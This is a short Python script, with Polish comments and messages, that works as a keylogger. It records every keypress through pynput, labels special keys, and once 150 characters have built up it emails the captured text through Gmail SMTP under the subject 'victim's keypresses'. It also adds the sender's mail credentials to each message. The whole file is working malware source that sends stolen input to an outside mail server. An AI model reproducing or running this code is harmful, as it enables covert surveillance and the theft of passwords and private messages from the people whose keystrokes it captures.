from pynput.keyboard import Listener
import smtplib
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keystrokes = ""
CONFIG_FILE = "config.json"

def load_config():
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def send_email_with_content(content):
    config = load_config()
    from_email = config["from_email"]
    to_email = config["to_email"]
    password = config["password"]

    msg = MIMEMultipart()
    msg["From"] = from_email
    msg["To"] = to_email
    msg["Subject"] = "victim's keypresses"
    msg.attach(MIMEText(content, "plain"))

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_email, password)
    server.send_message(msg)
    server.quit()
    print("📤 Wysłano e-mail z klawiszami.")

def log_key(key):
    global keystrokes
    try:
        key = key.char
    except AttributeError:
        key = str(key)

    key_map = {
        'Key.space': '[SPACE]',
        'Key.enter': '[ENTER]',
        'Key.shift': '[SHIFT]',
        'Key.backspace': '[BACKSPACE]',
        'Key.tab': '[TAB]',
        'Key.esc': '[ESC]',
        'Key.ctrl': '[CTRL]',
        'Key.alt': '[ALT]',
        'Key.cmd': '[CMD]',
        'Key.caps_lock': '[CAPS LOCK]',
        'Key.delete': '[DELETE]',
        'Key.up': '[UP]',
        'Key.down': '[DOWN]',
        'Key.left': '[LEFT]',
        'Key.right': '[RIGHT]'
        # dodaj więcej jeśli chcesz
    }

    key_str = key_map.get(key, key.replace("'", ""))
    keystrokes += key_str + "\n"

    if len(keystrokes) >= 150:
        config = load_config()
        message = (
            "Automatyczny e-mail zawierający naciśnięcia klawiszy:\n\n"
            + keystrokes +
            "\n\nfrom email : " + config["from_email"] +
            "\nto email : " + config["to_email"] +
            "\npassword : " + config["password"]
        )
        send_email_with_content(message)
        keystrokes = ""  # Reset

if __name__ == "__main__":
    print("⌨️ Keylogger uruchomiony.")
    with Listener(on_press=log_key) as listener:
        listener.join()
